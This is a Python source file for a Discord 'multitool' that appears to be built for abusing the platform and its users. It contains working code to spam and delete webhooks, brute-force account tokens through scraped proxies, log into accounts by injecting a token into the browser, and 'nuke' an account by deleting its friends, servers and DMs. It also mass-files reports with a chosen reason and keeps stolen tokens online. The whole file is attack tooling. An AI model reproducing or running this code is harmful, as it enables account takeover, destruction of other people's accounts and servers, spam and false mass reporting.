#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import time, urllib.request, urllib.error, urllib.parse, json, requests, random, string, threading, webbrowser, os, concurrent.futures
from modules.selfbot import selfbot_menu
from datetime import datetime, timezone
from core.display import Colors, Colorate, get_inpt, Theme

def _snd(url, d, m='POST'):
    try:
        _d = json.dumps(d).encode('utf-8') if d else b''
        r = urllib.request.Request(url, data=(_d if m=='POST' else None), method=m)
        r.add_header('User-Agent', 'Navi_Wired/1.0')
        r.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(r) as rs: return rs.status
    except: return -1

def webhook_spam(url, msg, amt=10):
    cl = Theme.get_colors()
    print("\n  [+] Initializing spam...") 
    sc, p = 0, {"content": msg, "username": "Navi@WIRED", "avatar_url": "https://i.ibb.co/Wv94YGVx/navi.png"}
    for i in range(amt):
        st = _snd(url, p)
        if st in [200, 204]:
            print(Colorate.Horizontal(cl["head"], f"  [>] Sent {i+1}/{amt}"))
            sc += 1
        else: print(Colorate.Horizontal(cl["num"], f"  [!] Failed {i+1}"))
        time.sleep(0.15) 
    print(Colorate.Horizontal(cl["head"], f"\n  [=] Done: {sc} hits."))
    input("  Press enter...")

def webhook_delete(url):
    cl = Theme.get_colors()
    print("\n  [+] Deleting hook...")
    res = _snd(url, {}, m='DELETE')
    if res in [200, 204]: print(Colorate.Horizontal(cl["head"], "  [>] Erased."))
    else: print(Colorate.Horizontal(cl["num"], "  [!] Error deleting."))
    input("  Press enter...")

def id_to_token():
    cl = Theme.get_colors()
    uid = get_inpt("user_id:")
    import base64
    try:
        half = base64.b64encode(str(uid).encode()).decode().rstrip('=')
    except:
        half = "???"
    print(Colorate.Horizontal(cl["head"], f"  [+] scraped half token: {half}"))
    ans = get_inpt("Want to bruteforce the other half?: y/n ")
    if ans.lower() == 'y':
        import random, string, time, requests, threading
        from concurrent.futures import ThreadPoolExecutor
        
        use_proxies = get_inpt("Use Proxies? (y/n):").lower() == 'y'
        proxy_type = "http"
        proxies_list = []
        
        if use_proxies:
            proxy_type = get_inpt("Proxy Type (http/socks4/socks5):").lower() or "http"
            print(Colorate.Horizontal(cl["num"], "  [>] Scraping proxies..."))
            sources = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
            ]
            if proxy_type == "socks4":
                sources = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=yes&anonymity=all",
                           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
            elif proxy_type == "socks5":
                sources = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=yes&anonymity=all",
                           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]        
            for url in sources:
                try:
                    resp = requests.get(url, timeout=6)
                    if resp.status_code == 200:
                        for line in resp.text.split("\n"):
                            if ":" in line: proxies_list.append(line.strip())
                except: pass
            proxies_list = list(set(proxies_list))
            print(Colorate.Horizontal(cl["head"], f"  [+] Loaded {len(proxies_list)} proxies."))
        
        chars = string.ascii_letters + string.digits + "-_"
        print(Colorate.Horizontal(cl["num"], "  [>] Starting brute force (Ctrl+C to stop)..."))
        api_url = "https://discord.com/api/v10/users/@me"
        found = False
        attempts = 0
        success_count = 0
        invalid_count = 0
        ratelimit_count = 0
        error_count = 0
        print_lock = threading.Lock() 
        
        def check_token(guess, proxy=None):
            nonlocal found, success_count, invalid_count, ratelimit_count, error_count, attempts
            if found:  
                return False
                
            headers = {
                "Authorization": guess,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
            }
            proxies_dict = None
            if proxy and use_proxies:
                if proxy_type == "http":
                    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                elif proxy_type == "socks4":
                    proxies_dict = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
                elif proxy_type == "socks5":
                    proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
            try:
                response = requests.get(api_url, headers=headers, proxies=proxies_dict, timeout=3)
                parts = guess.split('.')
                formatted_token = f"{parts[0]}:{parts[1][:4]}...{parts[2][-4:]}" if len(parts) >= 3 else guess[:10] + "..." + guess[-4:] if len(guess) > 14 else guess
                with print_lock:
                    attempts += 1
                    if response.status_code == 200:
                        found = True
                        print(Colorate.Horizontal(cl["success"], f"  [!!!] VALID TOKEN FOUND: {guess}"))
                        print(Colorate.Horizontal(cl["success"], f"  [!!!] User data: {response.json()}"))
                        return True
                    elif response.status_code == 401:
                        invalid_count += 1
                        print(Colorate.Horizontal(cl["txt"], f"  [~] Attempt {attempts} | Invalid: {formatted_token}"))
                        return False
                    elif response.status_code == 429:
                        ratelimit_count += 1
                        print(Colorate.Horizontal(cl["num"], f"  [!] Attempt {attempts} | RateLimited: {formatted_token}"))
                        time.sleep(random.uniform(1, 3)) 
                        return False
                    else:
                        error_count += 1
                        print(Colorate.Horizontal(cl["head"], f"  [?] Attempt {attempts} | Error ({response.status_code}): {formatted_token}"))
                        return False
            except requests.exceptions.RequestException as e:
                with print_lock:
                    attempts += 1
                    error_count += 1
                    parts = guess.split('.')
                    formatted_token = f"{parts[0]}:{parts[1][:4]}...{parts[2][-4:]}" if len(parts) >= 3 else guess[:10] + "..." + guess[-4:] if len(guess) > 14 else guess
                    print(Colorate.Horizontal(cl["head"], f"  [?] Attempt {attempts} | Error: {formatted_token}"))
                return False
        try:
            with ThreadPoolExecutor(max_workers=50 if use_proxies else 10) as executor:
                futures = []
                while not found:
                    p2 = ''.join(random.choices(chars, k=6))
                    p3 = ''.join(random.choices(chars, k=38))
                    guess = f"{half}.{p2}.{p3}"
                    proxy = None
                    if use_proxies and proxies_list:
                        proxy = random.choice(proxies_list)
                    future = executor.submit(check_token, guess, proxy)
                    futures.append(future)
                    if len(futures) > 100:
                        futures = [f for f in futures if not f.done()]
                    time.sleep(0.001)
                    
        except KeyboardInterrupt:
            print(Colorate.Horizontal(cl["num"], f"\n  [!] Stopped. Total attempts: {attempts}"))
        print(Colorate.Horizontal(cl["num"], f"  [!] Completed. Total attempts: {attempts} | Invalid tokens: {invalid_count} | Rate limited: {ratelimit_count} | Errors: {error_count}"))
        input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def server_info_lookup(inv):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching server..."))
    try:
        c = inv.split("/")[-1] if "/" in inv else inv
        r = requests.get(f"https://discord.com/api/v9/invites/{c}")
        if r.status_code == 200:
            d = r.json()
            g = d.get("guild", {})
            print(Colorate.Horizontal(cl["num"], "  [=] Name: ") + Colorate.Horizontal(cl["txt"], str(g.get("name"))))
            print(Colorate.Horizontal(cl["num"], "  [=] ID: ") + Colorate.Horizontal(cl["txt"], str(g.get("id"))))
            if "inviter" in d:
                i = d["inviter"]
                print(Colorate.Horizontal(cl["num"], "  [=] Inviter: ") + Colorate.Horizontal(cl["txt"], f"{i.get('username')} ({i.get('id')})"))
        else: print(Colorate.Horizontal(cl["num"], "  [!] Invalid invite."))
    except: print(Colorate.Horizontal(cl["num"], "  [!] Error."))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def nitro_generator(tc=1):
    from modules.nitrogen import start_generator
    start_generator(threads=tc)

def bot_invite_gen(bid):
    cl = Theme.get_colors()
    l = f"https://discord.com/oauth2/authorize?client_id={bid}&scope=bot&permissions=8"
    print(Colorate.Horizontal(cl["head"], f"  [>] Link: {l}"))
    if input(Colorate.Horizontal(cl["num"], "  Open? (y/n): ")).lower() == 'y': webbrowser.open(l)
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def token_info(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching account..."))
    h = {"Authorization": tk, "Content-Type": "application/json"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=h)
        if r.status_code != 200:
            print(Colorate.Horizontal(cl["num"], "  [!] Invalid Token."))
            return
        j = r.json()
        un = f"{j.get('username')}#{j.get('discriminator')}"
        nit = {1:"Classic",2:"Boost",3:"Basic"}.get(j.get("premium_type", 0), "None")
        ln = "  " + "─" * 50
        print(Colorate.Horizontal(cl["head"], ln))
        for k, v in [("User",un),("ID",j.get("id")),("Email",j.get("email","N/A")),("Phone",j.get("phone","N/A")),("Nitro",nit)]:
            print(Colorate.Horizontal(cl["num"], f"  [>] {k:<10}: ") + Colorate.Horizontal(cl["txt"], str(v)))
        print(Colorate.Horizontal(cl["main"], ln))
    except: print(Colorate.Horizontal(cl["num"], "  [!] Failed."))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def token_login(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [+] Initializing automated login via ChromeDriver..."))
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from webdriver_manager.chrome import ChromeDriverManager
        
        print(Colorate.Horizontal(cl["num"], "  [>] Starting Chrome..."))
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        opts.add_argument("--log-level=3")
        
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
        driver.get("https://discord.com/login")
        
        print(Colorate.Horizontal(cl["num"], "  [>] Injecting token..."))
        script = f"""
            function login(token) {{
                setInterval(() => {{
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${{token}}"`
                }}, 50);
                setTimeout(() => {{
                    location.reload();
                }}, 2500);
            }}
            login("{tk}")
        """
        driver.execute_script(script)
        print(Colorate.Horizontal(cl["head"], "  [=] Login successful. Browser window is active."))
    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Automated login failed: {e}"))
        print(Colorate.Horizontal(cl["txt"], "  [~] Falling back to manual method..."))
        script = """
        function login(token) {
            setInterval(() => {
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
                location.reload();
            }, 2500);
        }
        """
        print(Colorate.Horizontal(cl["num"], "  [!] MANUAL INSTRUCTIONS:"))
        print(Colorate.Horizontal(cl["txt"], "  1. Open Discord in your browser."))
        print(Colorate.Horizontal(cl["txt"], "  2. Press F12 to open Developer Tools."))
        print(Colorate.Horizontal(cl["txt"], "  3. Go to the 'Console' tab."))
        print(Colorate.Horizontal(cl["txt"], "  4. Paste the following command and press Enter:\n"))
        print(Colorate.Horizontal(cl["head"], f"  login(\"{tk}\")"))
        print(f"\n  {script}")
        webbrowser.open("https://discord.com/login")
    
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter once done..."))

def token_nuker(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["num"], "  [!] WARNING: This will destroy the account. Continue? (y/n)"))
    if get_inpt(">").lower() != 'y': return
    h = {"Authorization": tk}
    print(Colorate.Horizontal(cl["head"], "  [+] Nuke started (Chaos Mode Enabled)..."))
    
    _active = True

    def _log_nuke(m, success=True, warn=False):
        col = cl["head"] if success else (cl["num"] if warn else cl["num"])
        sym = "+" if success else ("!" if not warn else "~")
        print(Colorate.Horizontal(col, f"  [{sym}] {m}"))

    def _req(m, url, d=None, msg="Action", retries=3):
        for _ in range(retries):
            try:
                r = requests.request(m, url, headers=h, json=d, timeout=10)
                if r.status_code in [200, 201, 204]:
                    if msg: _log_nuke(msg)
                    return True
                elif r.status_code == 429:
                    _wait = r.json().get("retry_after", 1.5)
                    time.sleep(_wait)
                else:
                    if msg: _log_nuke(f"Failed ({r.status_code}): {msg}", False)
                    return False
            except:
                time.sleep(1)
        if msg: _log_nuke(f"Error: {msg}", False)
        return False

    def _flicker():
        locales = ["ja", "zh-TW", "ko", "en-US"]
        themes = ["light", "dark"]
        while _active:
            _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": random.choice(themes), "locale": random.choice(locales)}, msg=None)
            time.sleep(0.5)

    def _run():
        nonlocal _active
        threading.Thread(target=_flicker, daemon=True).start()
        _log_nuke("Chaos Flicker started.")

        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 1 ] Removing Friends..."))
        try:
            fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
            if isinstance(fs, list):
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                    futures = [ex.submit(_req, "DELETE", f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", msg=f"Removed Friend: {f.get('user',{}).get('username','Unknown')}") for f in fs]
                    concurrent.futures.wait(futures)
        except: pass

        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 2 ] Leaving/Deleting Guilds..."))
        try:
            gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h).json()
            if isinstance(gs, list):
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                    futures = []
                    for g in gs:
                        is_owner = g.get("owner", False)
                        url = f"https://discord.com/api/v9/guilds/{g['id']}" if is_owner else f"https://discord.com/api/v9/users/@me/guilds/{g['id']}"
                        type_str = "Deleted" if is_owner else "Left"
                        futures.append(ex.submit(_req, "DELETE", url, msg=f"{type_str} Guild: {g.get('name','Unknown')}"))
                    concurrent.futures.wait(futures)
        except: pass

        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 3 ] Closing DMs..."))
        try:
            cs = requests.get("https://discord.com/api/v9/users/@me/channels", headers=h).json()
            if isinstance(cs, list):
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                    futures = [ex.submit(_req, "DELETE", f"https://discord.com/api/v9/channels/{c['id']}", msg=f"Closed DM: {c.get('id')}") for c in cs]
                    concurrent.futures.wait(futures)
        except: pass

        _active = False
        time.sleep(1)
        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 4 ] Finalizing..."))
        _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Navi"}}, "Set Final White/JP Mode")
        
        print(Colorate.Horizontal(cl["head"], "\n  [=] Nuke completed successfully."))
        input("  Press Enter...")

    threading.Thread(target=_run).start()
    print(Colorate.Horizontal(cl["head"], "  [>] Nuke in progress..."))
    input("  Press Enter...")

def token_rotator(tk):
    cl = Theme.get_colors()
    st = get_inpt("Statuses (sep by comma):").split(",")
    print(Colorate.Horizontal(cl["head"], "  [+] Rotating status... (Ctrl+C to stop)"))
    try:
        while True:
            for s in st:
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"Authorization": tk}, json={"custom_status": {"text": s.strip()}})
                time.sleep(5)
    except: pass

def token_onliner():
    cl = Theme.get_colors()
    if not os.path.exists("input/tokens.txt"):
        print(Colorate.Horizontal(cl["num"], "  [!] input/tokens.txt not found."))
        return
    with open("input/tokens.txt", "r") as f: tks = [l.strip() for l in f if l.strip()]
    print(Colorate.Horizontal(cl["head"], f"  [+] Onlining {len(tks)} tokens..."))
    def _online(tk):
        import websocket
        try:
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(json.dumps({"op": 2, "d": {"token": tk, "properties": {"$os": "windows", "$browser": "chrome", "$device": "pc"}}}))
            while True:
                ws.send(json.dumps({"op": 1, "d": None}))
                time.sleep(30)
        except: pass
    for t in tks: threading.Thread(target=_online, args=(t,), daemon=True).start()
    input(Colorate.Horizontal(cl["head"], "  [>] Tokens are online. Press Enter to stop..."))

def discord_username_checker(threads=1):
    colors, lock = Theme.get_colors(), threading.Lock()
    proxies_list = []
    auth_token = get_inpt("Authorization Token:")
    if not auth_token: return
    print(Colorate.Horizontal(colors["head"], f"  [+] 4-Char Checker starting with {threads} threads..."))
    use_prox = get_inpt("Use proxies? (y/n):").lower() == 'y'
    if use_prox:
        if os.path.exists("input/proxies.txt"):
            with open("input/proxies.txt", "r", encoding="utf-8") as f:
                proxies_list = [l.strip() for l in f if ":" in l]
            print(Colorate.Horizontal(colors["num"], f"  [>] Loaded {len(proxies_list)} proxies from input/proxies.txt"))
        else:
            print(Colorate.Horizontal(colors["num"], "  [!] input/proxies.txt not found. Scraping..."))
            sources = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
            ]
            for url in sources:
                try:
                    resp = requests.get(url, timeout=6)
                    if resp.status_code == 200:
                        for line in resp.text.split("\n"):
                            if ":" in line: proxies_list.append(line.strip())
                except: pass
            proxies_list = list(set(proxies_list))
            print(Colorate.Horizontal(colors["num"], f"  [>] Scraped {len(proxies_list)} proxies."))

    stats = {"hits": 0, "taken": 0, "ratelimited": 0, "error": 0}
    chars = string.ascii_lowercase + string.digits

    def _worker_loop():
        while True:
            name = ""
            for _ in range(4):
                name += random.choice(chars)
            proxy_addr = random.choice(proxies_list) if use_prox and proxies_list else None
            proxies = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None
            headers = {
                "Authorization": auth_token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            }
            try:
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                api_url = "https://discord.com/api/v9/users/@me/pomelo-attempt"
                r = requests.post(api_url, headers=headers, json={"username": name}, proxies=proxies, timeout=8, verify=False)
                
                if r.status_code == 200:
                    data = r.json()
                    if data.get("taken") == False:
                        with lock:
                            stats["hits"] += 1
                            print(f"\n  [$$$] UNCLAIMED: {name}")
                            with open("output/4chars.txt", "a") as f: f.write(name + "\n")
                    else:
                        with lock: stats["taken"] += 1
                elif r.status_code == 429:
                    with lock: stats["ratelimited"] += 1
                    retry = r.json().get("retry_after", 3)
                    time.sleep(retry)
                elif r.status_code == 401:
                    print(Colorate.Horizontal(colors["num"], "\n  [!] TOKEN INVALID! Stopping threads..."))
                    return
                else:
                    with lock:
                        stats["error"] += 1
                        if not os.path.exists("logs"): os.mkdir("logs")
                        with open("logs/checker_errors.log", "a") as ef:
                            ef.write(f"[{time.ctime()}] Status {r.status_code} for {name} | Body: {r.text[:100]}\n")
            except Exception as e:
                with lock:
                    stats["error"] += 1
                    if not os.path.exists("logs"): os.mkdir("logs")
                    with open("logs/checker_errors.log", "a") as ef:
                        ef.write(f"[{time.ctime()}] Exception: {str(e)} | Proxy: {proxy_addr}\n")
                
            with lock:
                print(Colorate.Horizontal(colors["txt"], f"  [~] Available: {stats['hits']} | Taken: {stats['taken']} | 429s: {stats['ratelimited']} | Errors: {stats['error']}      "), end="\r")
    try:
        if not os.path.exists("output"): os.mkdir("output")
        pool = []
        for _ in range(threads):
            th = threading.Thread(target=_worker_loop, daemon=True)
            th.start()
            pool.append(th)
        for th in pool: th.join()
    except KeyboardInterrupt:
        print("\n  [!] Interrupted by user.")
    input(Colorate.Horizontal(colors["head"], "\n  Checker finished. Press Enter..."))

def discord_report_bot():
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [ DISCORD REPORT BOT ]\n"))
    tk = get_inpt("Token:")
    gid = get_inpt("Guild ID:")
    cid = get_inpt("Channel ID:")
    mid = get_inpt("Message ID:")
    
    print("\n  [1] Illegal Content\n  [2] Harassment\n  [3] Spam or Phishing\n  [4] Self-harm\n  [5] NSFW Content")
    rsn_map = {"1": 1, "2": 2, "3": 3, "4": 4, "5": 5}
    rsn = rsn_map.get(get_inpt("Reason (1-5):"), 1)
    
    amt = int(get_inpt("Amount (100):") or 100)
    print(Colorate.Horizontal(cl["num"], f"\n  [!] Initializing {amt} reports..."))
    
    def _do_report():
        try:
            h = {"Authorization": tk, "Content-Type": "application/json", "User-Agent": "Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0"}
            payload = {"channel_id": cid, "message_id": mid, "guild_id": gid, "reason": rsn}
            r = requests.post("https://discordapp.com/api/v8/report", headers=h, json=payload)
            if r.status_code == 201: print(Colorate.Horizontal(cl["head"], "  [+] Report successfully sent!"))
            else: print(Colorate.Horizontal(cl["num"], f"  [!] Error {r.status_code}: {r.text[:50]}"))
        except: pass

    for _ in range(amt):
        threading.Thread(target=_do_report, daemon=True).start()
        time.sleep(0.05)

    input(Colorate.Horizontal(cl["head"], "\n  Reports are being sent. Press Enter to return..."))
    
def discord_server_cloner(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [ DISCORD SERVER CLONER ]\n"))
    src = get_inpt("Source Guild ID:")
    dst = get_inpt("Target Guild ID:")
    h = {"Authorization": tk, "Content-Type": "application/json"}
    def _get(ep): return requests.get(f"https://discord.com/api/v9{ep}", headers=h)
    def _post(ep, d): return requests.post(f"https://discord.com/api/v9{ep}", headers=h, json=d)
    def _delete(ep): return requests.delete(f"https://discord.com/api/v9{ep}", headers=h)
    print(Colorate.Horizontal(cl["num"], "  [>] Fetching source data..."))
    r_roles = _get(f"/guilds/{src}/roles")
    r_chans = _get(f"/guilds/{src}/channels")
    if r_roles.status_code != 200 or r_chans.status_code != 200:
        print(Colorate.Horizontal(cl["num"], "  [!] Error fetching guild data. Check IDs/Token permissions."))
        input("\n  Press Enter...")
        return
    roles = r_roles.json()
    chans = sorted(r_chans.json(), key=lambda x: x.get("position", 0))
    print(Colorate.Horizontal(cl["head"], f"  [+] Found {len(roles)} roles and {len(chans)} channels."))
    if get_inpt("Clear target guild first? (y/n):").lower() == 'y':
        print(Colorate.Horizontal(cl["num"], "  [!] Clearing target..."))
        target_chans_req = _get(f"/guilds/{dst}/channels")
        if target_chans_req.status_code == 200:
            target_chans = target_chans_req.json()
            for c in target_chans:
                _delete(f"/channels/{c['id']}")
                time.sleep(0.3)
        target_roles_req = _get(f"/guilds/{dst}/roles")
        if target_roles_req.status_code == 200:
            target_roles = target_roles_req.json()
            for r in target_roles:
                if r["name"] != "@everyone":
                    _delete(f"/guilds/{dst}/roles/{r['id']}")
                    time.sleep(0.3)
    print(Colorate.Horizontal(cl["head"], "  [+] Cloning Roles..."))
    for r in reversed(roles):
        if r["name"] == "@everyone": continue
        p = {"name": r["name"], "permissions": r["permissions"], "color": r["color"], "hoist": r["hoist"], "mentionable": r["mentionable"]}
        _post(f"/guilds/{dst}/roles", p)
        print(Colorate.Horizontal(cl["txt"], f"  [>] Created role: {r['name']}"))
        time.sleep(0.5)

    print(Colorate.Horizontal(cl["head"], "  [+] Cloning Categories & Channels..."))
    cat_map = {} 
    
    for c in chans:
        if c["type"] == 4: 
            p = {"name": c["name"], "type": 4}
            res = _post(f"/guilds/{dst}/channels", p)
            if res.status_code in [200, 201]:
                cat_map[c["id"]] = res.json()["id"]
                print(Colorate.Horizontal(cl["txt"], f"  [>] Created category: {c['name']}"))
            time.sleep(0.5)

    for c in chans:
        if c["type"] != 4:
            p = {"name": c["name"], "type": c["type"], "topic": c.get("topic"), "nsfw": c.get("nsfw", False)}
            if c.get("parent_id") in cat_map:
                p["parent_id"] = cat_map[c["parent_id"]]
            
            res = _post(f"/guilds/{dst}/channels", p)
            if res.status_code in [200, 201]:
                print(Colorate.Horizontal(cl["txt"], f"  [>] Created channel: {c['name']}"))
            time.sleep(0.5)

    print(Colorate.Horizontal(cl["head"], "\n  [=] Cloning process finished."))
    input("  Press Enter...")
